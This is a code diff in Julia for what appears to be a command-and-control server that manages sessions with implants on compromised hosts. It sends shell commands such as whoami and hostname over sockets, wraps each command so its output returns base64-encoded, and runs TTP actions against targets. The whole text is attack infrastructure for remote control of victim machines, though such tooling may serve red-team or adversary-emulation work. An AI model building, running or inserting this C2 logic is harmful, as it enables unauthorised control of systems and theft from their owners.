@@ -1,11 +1,13 @@
 using UUIDs
 using Sockets
+using Base64
 
 
 Base.@kwdef struct Session <: AbstractSession 
     id::AbstractString = string(uuid4())
     commands::Channel = Channel{String}(32)
     results::Channel = Channel{Tuple{String, String}}(32)
+    compressResults::Bool = true
 end
 
 Base.@kwdef mutable struct C2
@@ -14,15 +16,29 @@ Base.@kwdef mutable struct C2
 end
 
 
-function sendCommand(conn, cmd::String)
-    @debug " 📥 sending '$cmd'"
+function sendCommand(conn, cmd::String, compress::Bool=true)
+
+    if compress
+        cmd = cmd * " | base64 -w 0; echo ''" # also need to drop the standard newlines after 76 chars
+    end
+
+    @info " 📥 sending '$cmd'" 
     write(conn, "$cmd\n")
     # response = readline(conn) # works only for single line responses
     # this is considered bad practice, maybe find a better alternative 
     # that can read all available bytes (also multiline responses)
-    bytes = readavailable(conn)
-    response = strip(join(map(Char, bytes)))
+
+    bytes = readline(conn)
+
+    println("read $(length(bytes)) bytes")
+    @debug "Got raw '$bytes'"
+    if compress
+        response = strip(String(base64decode(bytes)))
+    else
+        response = strip(join(map(Char, bytes)))
+    end
     @debug "Got '$response'"
+
     return response
 end
 
@@ -30,9 +46,9 @@ function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
     session = Session()
     c2.sessions[session.id] = session
 
-    hostname = sendCommand(conn, "hostname")
-    user = sendCommand(conn, "whoami")
-    os = inferOS(sendCommand(conn, "uname"))
+    hostname = sendCommand(conn, "hostname", session.compressResults)
+    user = sendCommand(conn, "whoami", session.compressResults)
+    os = inferOS(sendCommand(conn, "uname", session.compressResults))
 
     publish!(bus, SessionStarted(id=session.id, listenerId=listenerId, hostname=hostname, user=user, os=os))
     # active lifetime of the implant
@@ -40,7 +56,7 @@ function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
         # maybe send periodic pings to session, if it's a simple shell?
     for cmd in session.commands
         # println(" >>>> 🫡 Command: $cmd")
-        res = sendCommand(conn, cmd)
+        res = sendCommand(conn, cmd, session.compressResults)
         put!(session.results, (cmd, res))
     end
 
@@ -106,14 +122,14 @@ function executeActionOnTarget(ev::ExecuteActionOnTarget, c2::C2)
     end
     # TODO implement error handling if command is not possible
     # TODO get the TTP from the armory
-    # TODO attempt dependency injection for the various TTPs depending on their signature
+    # TODO attempt dependency injection for the various TTPs depending on their signature .. maybe with `methods` function
+        # println("Signature of function: ")
+        # println(methods(ev.ttp.action))
 
-    if typeof(ev.ttp.action) <: Function
-        println("Signature of function: ")
-        println(methods(ev.ttp.action))
+    if isa(ev.ttp.action, Function)
         result = ev.ttp.action(session, ev.target)
-    elseif typeof(ev.ttp.action) <: AbsrtactString
-        put!(session.commands, ev.action)
+    elseif isa(ev.ttp.action, AbstractString)
+        put!(session.commands, ev.ttp.action)
         executedAction, result = take!(session.results)
     else
         @error "Action type not supported"
@@ -122,9 +138,9 @@ function executeActionOnTarget(ev::ExecuteActionOnTarget, c2::C2)
 
     if isa(result, Event)
         # return result as a dedicated event to be sent to the bus, instead of the wrapper Event
-        return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id), result
+        return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id, target=ev.target), result
     else
-        return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id, output=result)
+        return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id, target=ev.target, output=result)
     end 
 
 end
